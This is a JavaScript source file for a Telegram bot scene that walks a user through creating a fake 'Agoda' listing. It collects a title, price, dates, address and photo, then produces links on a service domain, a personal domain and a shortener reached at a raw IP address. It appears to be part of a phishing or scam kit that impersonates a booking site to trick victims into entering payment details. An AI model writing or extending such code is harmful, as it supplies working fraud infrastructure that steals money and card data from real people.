const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, User, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const myAd = require("../../commands/myAd");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");

const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_agoda_eu",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "agoda_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки AGODA");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.scene
        .reply("Введите название объекта", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите цену объекта", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      var amount = ctx.message.text;


      ctx.scene.state.data.price = amount;

      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },


  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите дату заезда и отьезда (12.12.12 - 13.13.13)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();

      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.date1 = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите адрес объекта", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();

      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.address = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {

      await ctx.scene
        .reply("Отправьте изображение в сжатом формате", {
          reply_markup: Markup.inlineKeyboard([

            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[1].file_id
      );
      ctx.wizard.state.data.photo = await downloadImage(photo_link);
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err)
      if (ctx.message.text) return ctx.wizard.prevStep();

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "agoda_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      console.log(ctx.scene.state.data);
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        version: "1",
        balanceChecker: false,
        ...ctx.scene.state.data,
        serviceCode: "agoda_eu",
      });

      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === 'ECONNABORTED') {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null;
      }

      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl,
      });

      log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`);

      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => { });
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;